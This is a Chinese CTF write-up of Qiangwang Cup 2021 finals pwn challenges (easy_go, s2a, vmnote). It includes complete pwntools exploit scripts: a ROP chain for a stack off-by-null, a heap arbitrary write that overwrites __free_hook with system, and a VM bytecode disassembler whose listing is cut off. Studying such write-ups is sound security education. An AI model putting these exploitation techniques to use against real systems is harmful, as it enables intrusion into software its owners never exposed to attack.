# 强网杯总决赛 2021


国内最受瞩目的比赛之一，拥有几乎最高的PWN/realworld赛题质量。

比赛时看了几道cold down, EXSI找到了洞但是不好复现...

<!--more-->

* easy_go
* vmnote
* s2a
* 强网先锋
* EXSI (Real World)

rank 3 with AAA


## 强网先锋

详见[前文](https://xidoo123.github.io/2021/07/cve-2009-1759/)

## easy_go

### overall

栈上有明显的off-by-null漏洞，可以修改rbp的低字节，通过两次leave ret来做stack-pivot.


    __int64 __fastcall sub_4015AB(__int64 a1, int a2) //vul_read()
    {
      unsigned int i; // [rsp+1Ch] [rbp-4h]
    
      for ( i = 0; (int)i < a2; ++i )
      {
        if ( read(0, (void *)((int)i + a1), 1uLL) <= 0 )
        {
          puts("read error");
          exit(0);
        }
        if ( *(_BYTE *)((int)i + a1) == 10 )
          break;
      }
      *(_BYTE *)((int)i + a1) = 0;                  // off-by-one
      return i;
    }


同时题目开启sandbox，只允许orw


    x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$ seccomp-tools dump ./easy_go
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
     0002: 0x06 0x00 0x00 0x00000000  return KILL
     0003: 0x20 0x00 0x00 0x00000000  A = sys_number
     0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
     0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
     0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
     0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
     0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
     0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
     0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0018: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0020
     0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0020: 0x06 0x00 0x00 0x00000000  return KILL


### Tips

赛题环境ubuntu20.04，建议同版本调试


    x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$ diff /usr/lib/x86_64-linux-gnu/libc-2.31.so ./libc-2.31.so
    x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$


调试时别忘了打开系统aslr


### Details

由于栈随机化现象，需要多尝试几次，在某一次可以跑到如下RSP与RBP，看到RBP正好成了用户可控区域。

![](https://i.loli.net/2021/07/13/romzLWBVX6dQ1iE.png)

此时直接调用vul_read()，十分幸运地是此时rdi与rsi都是合法的，同时rdi正好在当前栈附件，rsi也足够大。

```
────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────
 RAX  0x0                                                                                                                                    
 RBX  0x401740 ◂— endbr64                                                                                                                    
 RCX  0x0                                                                                                                                    
 RDX  0xa                                                                                                                                    
 RDI  0x7ffce71cf600 —▸ 0x404800 ◂— 0x0                                                                                                      
 RSI  0x7fa550e463c0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002                                                                           
 R8   0x7fa550e934a0 (_nl_global_locale) —▸ 0x7fa550e8f6c0 (_nl_C_LC_CTYPE) —▸ 0x7fa550e5ffc6 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* 'C' */   
 R9   0x18                                                                                                                                   
 R10  0x402061 ◂— 'continue?(0:no, 1:yes): '                                                                                                 
 R11  0x246                                                                                                                                  
 R12  0x401190 ◂— endbr64                                                                                                                    
 R13  0x7ffce71cf730 ◂— 0x1                                                                                                                  
 R14  0x0                                                                                                                                    
 R15  0x0                                                                                                                                    
 RBP  0x404800 ◂— 0x0                                                                                                                        
*RSP  0x7ffce71cf610 —▸ 0x7ffce71cf600 —▸ 0x404800 ◂— 0x0                                                                                    
*RIP  0x40168d ◂— call   0x4015ab                                                                                                            
─────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────
   0x401717    leave                                                                                                                         
   0x401718    ret                                                                                                                           
    ↓                                                                                                                                        
 ► 0x40168d    call   0x4015ab <0x4015ab>                                                                                                    
                                                                                                                                             
   0x401692    lea    rax, [rbp - 0x10]                                                                                                      
   0x401696    lea    rsi, [rip + 0x9ac]                                                                                                     
   0x40169d    mov    rdi, rax                                                                                                               
   0x4016a0    call   strcmp@plt <strcmp@plt>                                                                                                
                                                                                                                                             
   0x4016a5    test   eax, eax                                                                                                               
   0x4016a7    jne    0x4016b0 <0x4016b0>                                                                                                    
                                                                                                                                             
   0x4016a9    mov    eax, 0                                                                                                                 
   0x4016ae    jmp    0x4016cd <0x4016cd>                                                                                                    
──────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffce71cf610 —▸ 0x7ffce71cf600 —▸ 0x404800 ◂— 0x0                                                                             
01:0008│     0x7ffce71cf618 —▸ 0x401707 ◂— mov    dword ptr [rbp - 4], eax                                                                   
02:0010│     0x7ffce71cf620 —▸ 0x7ffce71cf630 —▸ 0x7ffce71cf640 ◂— 0x0                                                                       
03:0018│     0x7ffce71cf628 —▸ 0x40159a ◂— test   eax, eax                                                                                   
04:0020│     0x7ffce71cf630 —▸ 0x7ffce71cf640 ◂— 0x0                                                                                         
05:0028│     0x7ffce71cf638 —▸ 0x401735 ◂— mov    eax, 0                                                                                     
06:0030│     0x7ffce71cf640 ◂— 0x0                                                                                                           
07:0038│     0x7ffce71cf648 —▸ 0x7fa550cce0b3 (__libc_start_main+243) ◂— mov    edi, eax                                                     
────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────
 ► f 0         0x40168d                                                                                                                      
   f 1              0x0                                                                                                                      
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>                                                                                                                                      
```

接下来就是ROP了，并且溢出大小完全够用，我们选择溢出修改这次调用的vul_read()的返回地址。

以下payload便是第一轮ROP链，能通过stdout地址leak libc并重新返回到main函数进行下一次ROP。


    p.sendafter("client send >> ", "A" * 0x10)
    p.sendafter("continue?(0:no, 1:yes): ", p64(0x404500) + p64(0x40168d))
    
    pop_rsi_r15 = 0x4017a1 # pop rsi ; pop r15 ; ret
    pop_rdi = 0x4017a3 # pop rdi ; ret
    printf_plt = 0x401100
    stdout = 0x404020
    empty_ret = 0x40101a
    main_fucntion = 0x4016CF
    
    padding = 0x8
    
    payload = b"A" * padding
    payload += flat([pop_rdi, stdout, empty_ret, printf_plt])
    payload += p64(empty_ret) + p64(main_fucntion)
    
    # sleep(1)
    p.sendline(payload)


最终exp如下，需要多跑几次

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" dydxh / AAA """
from pwn import *
import sys, os, re
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

# p = remote('172.20.5.31', 22423)
p = process("./easy_go")

def exploit() :
    # beautyexp.hook(p)
    # init_connect()

    # gdb.attach(p, "b *0x0401717")

    p.sendafter("client send >> ", "A" * 0x10)
    p.sendafter("continue?(0:no, 1:yes): ", p64(0x404500) + p64(0x40168d))

    pop_rsi_r15 = 0x4017a1 # pop rsi ; pop r15 ; ret
    pop_rdi = 0x4017a3 # pop rdi ; ret
    printf_plt = 0x401100
    stdout = 0x404020
    empty_ret = 0x40101a
    main_fucntion = 0x4016CF

    padding = 0x8

    payload = b"A" * padding
    payload += flat([pop_rdi, stdout, empty_ret, printf_plt])
    payload += p64(empty_ret) + p64(main_fucntion)

    # sleep(1)
    p.sendline(payload)
    msg = p.recvuntil('\x7f').ljust(8, b'\x00')
    libc_addr = u64(msg) - 0x1ec6a0
    print("libc addr: 0x{:x}".format(libc_addr))
    input()
    environ_addr = libc_addr + 0x1ef2e0
    pop_rax = libc_addr + 0x4a550 # pop rax ; ret
    pop_rdx_r12 = libc_addr + 0x11c371 # pop rdx ; pop r12 ; ret
    syscall_addr = libc_addr + 0x2584d # syscall

    p.sendafter("client send >> ", b"A" * 0x10)
    p.sendafter("continue?(0:no, 1:yes): ", p64(0x404500) + p64(0x40168d))

    payload = b"A" * padding
    payload += flat([pop_rdi, environ_addr, empty_ret, printf_plt])
    payload += p64(empty_ret) + p64(main_fucntion)
    payload += b"A" * 0x100 + b"./flag\x00"
    p.sendline(payload)

    msg = p.recvuntil('\x7f').ljust(8, b'\x00')
    stack_addr = u64(msg)
    print("stack addr: 0x{:x}".format(stack_addr))
    input()

    flag_str_addr = stack_addr - 0x10
    open_addr = libc_addr + 0x110e50
    read_addr = libc_addr + 0x111130
    write_addr = libc_addr + 0x1111d0
    p.sendafter("client send >> ", b"A" * 0x10)
    p.sendafter("continue?(0:no, 1:yes): ", p64(0x404500) + p64(0x40168d))

    payload = b"A" * padding
    payload += flat([pop_rdi, flag_str_addr, pop_rsi_r15, 0, 0, open_addr])
    payload += flat([pop_rdi, 3, pop_rsi_r15, flag_str_addr, 0, pop_rdx_r12, 0x50, 0, read_addr])
    payload += flat([pop_rdi, 1, pop_rsi_r15, flag_str_addr, 0, pop_rdx_r12, 0x50, 0, write_addr])
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__" :
    exploit()

```

## s2a

### Overall

这是一个svg解析器（语法类似于xml），可以将用户输入的svg文件解析并打印出图像。


    '1. New picture.\n'   
    '2. Show picture.\n'  
    '3. Delete picture.\n'


漏洞点在于没有边界检查，在show功能中有以下代码片段，会将所有\<path\>标签依次解析，找到其指定的位置，赋予颜色。buf为二维动态数组，两个维度的idx都没有大小检测，使利用变得简单。



    do
      {
        if ( (v7->type & 0xFD) == 4 )
        {
          v8 = (path_attr *)v7->attr;
          if ( v8 )
          {
            v9 = (path_node *)v8->path;
            if ( v8->path )
            {
              color = v8->stroke_color;
              buf[v9->x][v9->y + 1] = color;    // forget to check x, y
              for ( ptr = v9->next; ptr; buf[next_x][next_y + 1] = color )
              {
                next_x = ptr->x;
                next_y = ptr->y;
                ptr = ptr->next;
              }
            }
          }
        }
        v7 = v7->end_node;
      }
      while ( v7 );


### Details

该二维数组由malloc再malloc实现，只要在堆上找到buf后面的libc相关地址（比如free过的unsorted bin地址），在一维解析时就可以弄到libc那边，再在二维解析时调整偏移。由于颜色是用户可控的，所以可以在libc地址进行任意次任意地址写。


    buf = (char **)malloc(8 * v3);
      if ( (_DWORD)v3 )
      {
        i = 0LL;
        *buf = (char *)malloc(cvs_width + 2);
        ...


可以先修改stdout的write_base来泄露libc地址，然后改free_hook为system地址提权。

exp如下（ubt20.04，原题版本18.04）

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" N0p / AAA """
from pwn import *
import sys, os, re

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

p = process("../s2a", aslr=False)
libc = ELF("../s2a").libc
# p = remote('172.20.5.31', 11002)

def recvptr(self): 
    return u64(self.recvn(6).ljust(8, b"\x00"))

pwnlib.tubes.remote.remote.recvptr = recvptr
pwnlib.tubes.process.process.recvptr = recvptr

def chose(n):
    p.sendlineafter("choice:", str(n))

def add(a0="0", a1="<svg>AAA</svg>"):
    chose("1")
    p.sendafter("idx:", (str(a0)+"\n")[:])
    p.sendafter("Input:", (str(a1)+"\n")[:])

def show(a0="0"):
    chose("2")
    p.sendafter("idx:", (str(a0)+"\n")[:])

def delete(a0="0"):
    chose("3")
    p.sendafter("idx:", (str(a0)+"\n")[:])

with open("test.svg", "rb") as fp:
    data = fp.read()
with open("test2.svg", "rb") as fp:
    data2 = fp.read()
with open("test3.svg", "rb") as fp:
    data3 = fp.read()
with open("test4.svg", "rb") as fp:
    data4 = fp.read()

#0x555555554000+0x7846 
# bps.append("*0x555555554000+0x779E") 

add(0, data)
add(1, data2)
add(2, data3)
show(2)
add(3, data2)
add(4, data)
delete(3)
delete(1)

show(0) 
p.recvn(9)
libc.addr = p.recvptr() - 0x1eb980
free_hook = libc.addr + libc.sym['__free_hook']
magic_addr = libc.addr + libc.sym['system']
print(hex(libc.addr))
print(hex(free_hook))
print(hex(magic_addr))

delete(0)
data5 = """<svg width="4" height="4" viewBox="0 0 4 4">\n"""
for i in range(6):
    x = '<path d="M{},110" stroke="#{}"/>\n'.format(0x2aa7+i, (hex(magic_addr & 0xff)[2:])*3)
    data5 += x
    magic_addr >>= 8
data5 += """</svg>"""
add(0, data5)

# gdb.attach(p, "b *0x555555554000+0x7846")

show(0)

delete(0)
add(0, '<cat flag;\x00>')

# print(p.recvline())

# p.close()
p.interactive()
                                                                         
```

/test.svg

```xml
<svg width="4" height="4" viewBox="0 0 4 4">
<path d="M2752,110"/>
<path d="M2752,110" stroke="#181818"/>
<path d="M2783,110"/>
</svg>
```

/test2.svg

```xml
<svg version="111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111" width="800" height="800" viewBox="0 0 800 800">
<path d="M1,1"/>
</svg>
```

/test3.svg

```xml
<svg width="4" height="4" viewBox="0 0 4 4">
<path d="M1,1" stroke="#181818"/>
</svg>
```


/test4.svg
```xml
<svg width="4" height="4" viewBox="0 0 4 4">
<path d="M1,1" stroke="#ffeedd"/>
</svg>
```


## vmnote

### Overall

vmpwn，实现了自己的指令集，并且在note.bin中用自己的指令集写了一个菜单。但漏洞不在菜单里，还是在指令上。在读size或者读idx的时候会有一个off-by-null，在虚拟机内部导致覆盖rbp低字节。

### Details

只允许orw


    x1do0@x1do0:~/linux_share/qwb_final/vmnote/vmnote$ seccomp-tools dump ./vmnote
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
     0002: 0x06 0x00 0x00 0x00000000  return KILL
     0003: 0x20 0x00 0x00 0x00000000  A = sys_number
     0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
     0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
     0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
     0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
     0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
     0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
     0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0018: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0020
     0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0020: 0x06 0x00 0x00 0x00000000  return KILL


先提取解析note.bin的指令内容

```python
from pwn import *

regs = [0 for i in range(12)]
stack = []
global rip, code, data
data = []
rip = 0x0
rsp = 0x1000
tmp_rsp = 0

def open_file():
    global code, data
    with open("../note.bin", "rb") as f:
        all_data = f.read()
        code = all_data[0x10:0x774+0x10]
        data = all_data[0x774+0x10:]

def translate():
    global rip, code
    while True:
        print("label_%x:    " % rip)
        val = u8(code[rip:rip+1])
        
        rip += 1
        types =(val >> 5) & 7
        opcode = val & 0x1F

        if opcode == 0:
            print("push reg[%d]" % u8(code[rip:rip+1]))
            rip += 1
        elif opcode == 1:
            if types == 1:
                print("mov reg[%d], word ptr data[reg[%d]]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            elif types == 3:
                print("mov reg[%d], dword ptr data[reg[%d]]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            elif types == 4:
                print("mov reg[%d], qword ptr data[reg[%d]]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        elif opcode == 2:
            print("nop")
            rip += 1
        elif opcode == 3:
            reg = u8(code[rip:rip+1])
            rip += 1
            if types == 0:
                print("read char reg[%d]" % reg)
            elif types == 1:
                print("read int reg[%d]" % reg)
            elif types == 2:
                print("read long reg[%d]" % reg)
            else:
                print("read char data[reg[%d]]" % reg) 
        elif opcode == 4:
            print("leave")
        elif opcode == 5:
            if types == 1:
                print("sub byte ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            if types == 2:
                print("sub word ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3])))
                rip += 1 + 2
            elif types == 3:
                print("sub dword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])))
                rip += 1 + 4
            elif types == 4:
                print("sub qword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9])))
                rip += 1 + 8
            else:
                print("sub reg[%d], reg[%d]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        elif opcode == 6:
            print("nop")
            rip += 1
        elif opcode == 7:
            if types == 1:
                print("add byte ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            if types == 2:
                print("add word ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3])))
                rip += 1 + 2
            elif types == 3:
                print("add dword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])))
                rip += 1 + 4
            elif types == 4:
                print("add qword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9])))
                rip += 1 + 8
            else:
                print("add reg[%d], reg[%d]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        elif opcode == 8:
            reg, idx = u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])
            if types == 1:
                print("mov byte ptr data[0x%x], reg[%d]" % (idx, reg))
                rip += 5
            if types == 2:
                print("mov word ptr data[0x%x], reg[%d]" % (idx, reg))
                rip += 5
            elif types == 3:
                print("mov dword ptr data[0x%x], reg[%d]" % (idx, reg))
                rip += 5
            elif types == 4:
                print("mov qword ptr data[0x%x], reg[%d]" % (idx, reg))
                rip += 5
        elif opcode == 9:
            reg_2, reg_1 = u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])
            if types == 1:
                print("mov byte ptr data[reg[%d]], reg[%d]" % (reg_1, reg_2))
                rip += 2
            if types == 2:
                print("mov word ptr data[reg[%d]], reg[%d]" % (reg_1, reg_2))
                rip += 2
            elif types == 3:
                print("mov dword ptr data[reg[%d]], reg[%d]" % (reg_1, reg_2))
                rip += 2
            elif types == 4:
                print("mov qword ptr data[reg[%d]], reg[%d]" % (reg_1, reg_2))
                rip += 2
        elif opcode == 0xA:
            reg, idx = u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])
            rip += 5
            if types == 1:
                print("mov reg[%d], byte ptr data[0x%x]" % ())
            if types == 2:
                print("mov reg[%d], word ptr data[0x%x]" % (reg, idx))
            elif types == 3:
                print("mov reg[%d], dword ptr data[0x%x]" % (reg, idx))
            elif types == 4:
                print("mov reg[%d], qword ptr data[0x%x]" % (reg, idx))
        elif opcode == 0xB:
            reg = u8(code[rip:rip+1])
            rip += 1
            if types == 0:
                print("cmp reg[%d], reg[%d]" % (reg, u8(code[rip:rip+1])))
                rip += 1
            elif types == 1:
                print("cmp reg[%d], 0x%x" % (reg, u64(code[rip:rip + 8])))
                rip += 8
        elif opcode == 0xC:
            print("call _exit")
            rip += 1
        elif opcode == 0xD:
            if types == 1:
                print("and byte ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            if types == 2:
                print("and word ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3])))
                rip += 1 + 2
            elif types == 3:
                print("and dword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])))
                rip += 1 + 4
            elif types == 4:
                print("and qword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9])))
                rip += 1 + 8
            else:
                print("and reg[%d], reg[%d]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        elif opcode == 0xE:
            print("dec reg[%d]" % u8(code[rip:rip+1]))
            rip += 1
        elif opcode == 0xF:
            if types == 1:
                print("div byte ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            if types == 2:
                print("div word ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3])))
                rip += 1 + 2
            elif types == 3:
                print("div dword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])))
                rip += 1 + 4
            elif types == 4:
                print("div qword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9])))
                rip += 1 + 8
            else:
                print("div reg[%d], reg[%d]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        elif opcode == 0x10:
            reg = u8(code[rip:rip+1])
            rip += 1
            if types == 1:
                print("jz reg[%d]" % reg)
            elif types == 2:
                print("jnz reg[%d]" % reg)
            elif types == 3:
                print("jl reg[%d]" % reg)
            elif types == 4:
                print("jg reg[%d]" % reg)
            else:
                print("jmp reg[%d]" % reg)
        elif opcode == 0x11:
            if types != 0:
                print("call label_%x" % u32(code[rip:rip + 4]))
                rip += 4
            else:
                print("call reg[%d]" % u8(code[rip:rip+1]))
                rip += 1
        elif opcode == 0x12:
            print("inc reg[%d]" % u8(code[rip:rip+1]))
            rip += 1
        elif opcode == 0x13:
            imm = u32(code[rip:rip + 4])
            rip += 4
            if types == 1:
                print("jz label_%x" % imm)
            elif types == 2:
                print("jnz label_%x" % imm)
            elif types == 3:
                print("jl label_%x" % imm)
            elif types == 4:
                print("jg label_%x" % imm)
            else:
                print("jmp label_%x" % imm)
        elif opcode == 0x14:
            print("pop reg[%d]" % u8(code[rip:rip+1]))
            rip += 1
        elif opcode == 0x15:
            if types == 1:
                print("or byte ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            if types == 2:
                print("or word ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3])))
                rip += 1 + 2
            elif types == 3:
                print("or dword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])))
                rip += 1 + 4
            elif types == 4:
                print("or qword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9])))
                rip += 1 + 8
            else:
                print("or reg[%d], reg[%d]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        elif opcode == 0x16:
            if types == 1:
                print("mov byte ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            elif types == 2:
                print("mov word ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3])))
                rip += 1 + 2
            elif types == 3:
                print("mov dword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])))
                rip += 1 + 4
            elif types == 4:
                print("mov qword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9])))
                rip += 1 + 8
            else:
                print("mov reg[%d], reg[%d]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        elif opcode == 0x17:
            reg = u8(code[rip:rip+1])
            rip += 1
            if types == 0:
                print("print byte ptr reg[%d]" % reg)
            elif types == 1:
                print("print int reg[%d]" % reg)
            elif types == 2:
                print("print long reg[%d]" % reg)
            else:
                print("print byte ptr data[reg[%d]]" % reg)
        elif opcode == 0x18:
            print("ret")
            print("")
        elif opcode == 0x19:
            print("call menu")
        elif opcode == 0x1A:
            print('clear')
        elif opcode == 0x1B:
            reg = u8(code[rip:rip+1])
            rip += 1
            print("test reg[%d], reg[%d]" % (reg, u8(code[rip:rip+1])))
            rip += 1
        elif opcode == 0x1C:
            if types == 1:
                print("mul byte ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            if types == 2:
                print("mul word ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3])))
                rip += 1 + 2
            elif types == 3:
                print("mul dword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])))
                rip += 1 + 4
            elif types == 4:
                print("mul qword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9])))
                rip += 1 + 8
            else:
                print("mul reg[%d], reg[%d]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        elif opcode == 0x1D:
            if types == 1:
                print("xor byte ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
            if types == 2:clear
            elif types == 3:
                print("xor dword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5])))
                rip += 1 + 4
            elif types == 4:
                print("xor qword ptr reg[%d], 0x%x" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9])))
                rip += 1 + 8
            else:
                print("xor reg[%d], reg[%d]" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2])))
                rip += 2
        else:
            print("error")
            exit(0)

open_file()
translate()
# def get_string(offset, v):
#     global data
#     res = ""
#     idx = offset
#     i = 0
#     while True:
#         val = u8(data[idx])
#         val = val + 0x10000 - i
#         val &= 0xff
#         if val ^ v == 0:
#             print("-----------------------" + str(i) + "------------------------")
#             break
#         else:
#             res += chr(val ^ v)
#         idx += 1
#         i += 1
#     print(res)
# get_string(0x0, 0x89)
# get_string(0xC, 0x42)
# get_string(0x18, 0x24)
# get_string(0x132, 0x47)
# get_string(0x173, 0x11)
# get_string(0x17a, 0x11)
# get_string(0x182, 0x11)
# get_string(0x18d, 0x11)
'''
-----------------------10------------------------
challenge 
-----------------------10------------------------
passcode: 
-----------------------5------------------------
error
-----------------------63------------------------
----menu----
1. new
2. show
3. edit
4. delete
5. exit
choice>> 
-----------------------5------------------------
idx: 
-----------------------6------------------------
size: 
-----------------------9------------------------
content: 
-----------------------16------------------------
not implement!!!
'''
```

得到note.bin的指令，改成常用的寄存器并做一些处理。

```python
data = None

with open("res.txt", 'r') as f:
    data = f.read()
    data = data.replace('reg[0]', 'rdi')
    data = data.replace('reg[1]', 'rsi')
    data = data.replace('reg[2]', 'rdx')
    data = data.replace('reg[3]', 'rcx')
    data = data.replace('reg[4]', 'r8')
    data = data.replace('reg[5]', 'r9')
    data = data.replace('reg[6]', 'r10')
    data = data.replace('reg[7]', 'r11')
    data = data.replace('reg[8]', 'r12')
    data = data.replace('reg[9]', 'r13')
    data = data.replace('reg[10]', 'r14')
    data = data.replace('reg[11]', 'rbp')
    data = data.replace('reg[12]', 'rsp')

with open("res.txt", 'w') as f:
    f.write(data)
```

最终得到note.bin的虚拟汇编

```
label_0:      push rbp
label_2:      mov rbp, rsp
label_5:      call label_23
label_a:      call label_c5
label_f:      test rdi, rdi
label_12:     jz label_1c
label_17:     call label_145
label_1c:     call label_3d
label_21:     leave
label_22:     ret

label_23:     call decode_str
label_28:     mov  rdi, 0x0
label_32:     call label_4d
label_37:     call label_5c
label_3c:     ret

label_3d:     mov  rdi, 0x0
label_47:     call label_773
label_4c:     ret

label_4d:     mov rsi, rdi
label_50:     mov  rdi, 0x0
label_5a:     call menu
label_5b:     ret

label_5c:     mov rsi, rdi
label_5f:     mov  rdi, 0x1
label_69:     call menu
label_6a:     ret

label_6b:     mov  rdi, 0x2
label_75:     call menu
label_76:     ret

label_77:     mov rsi, rdi
label_7a:     mov  rdi, 0x3
label_84:     call menu
label_85:     ret

label_86:     mov rsi, rdi
label_89:     mov  rdi, 0x4
label_93:     call menu
label_94:     ret

label_95:     mov rsi, rdi
